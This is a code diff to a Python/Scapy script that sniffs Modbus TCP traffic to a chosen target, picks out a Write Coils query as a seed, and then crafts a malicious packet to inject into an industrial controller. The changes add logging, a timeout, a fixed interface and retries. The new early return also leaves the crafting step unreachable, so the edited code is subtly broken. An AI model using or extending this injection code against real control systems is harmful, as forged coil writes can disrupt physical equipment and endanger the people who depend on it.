@@ -24,19 +24,38 @@ class Modbus(Packet):
 
 def sniff_and_inject(target_ip):
     print(f"[*] Starting packet sniffing targeting {target_ip}")
+    print("[*] Waiting for Modbus TCP packets...")
     
+    retry_count = 0
     while True:
         # Sniff 4 packets (2x needed amount to prevent aliasing)
+        print(f"[*] Attempting packet capture (attempt {retry_count + 1})")
         packets = sniff(
             count=4,
+            timeout=5,  # Add 5 second timeout
+            iface="eth0",  # Specify the interface
             lfilter=lambda pkt: TCP in pkt and pkt[IP].dst == target_ip
         )
         
+        print(f"[*] Captured {len(packets)} packets")
+        
         # Check if penultimate packet is a Write Coils query
-        if len(packets) >= 2 and Raw in packets[-2] and b"\x0f\x00\x00\x00\x05\x01" in raw(packets[-2][Raw]):
-            seed_pkt = packets[-2]
-            print("[+] Found Write Coils query packet to use as seed")
-            break
+        if len(packets) >= 2:
+            for i, pkt in enumerate(packets):
+                print(f"[*] Analyzing packet {i+1}:")
+                if TCP in pkt:
+                    print(f"    Source IP: {pkt[IP].src}")
+                    print(f"    Dest IP: {pkt[IP].dst}")
+                    if Raw in pkt:
+                        raw_data = raw(pkt[Raw])
+                        print(f"    Raw data present: {raw_data.hex()}")
+                        if b"\x0f\x00\x00\x00\x05\x01" in raw_data:
+                            seed_pkt = pkt
+                            print("[+] Found Write Coils query packet to use as seed")
+                            return seed_pkt
+        
+        retry_count += 1
+        print(f"[*] No suitable packet found, retrying...")
     
     print("[*] Crafting malicious packet")
     
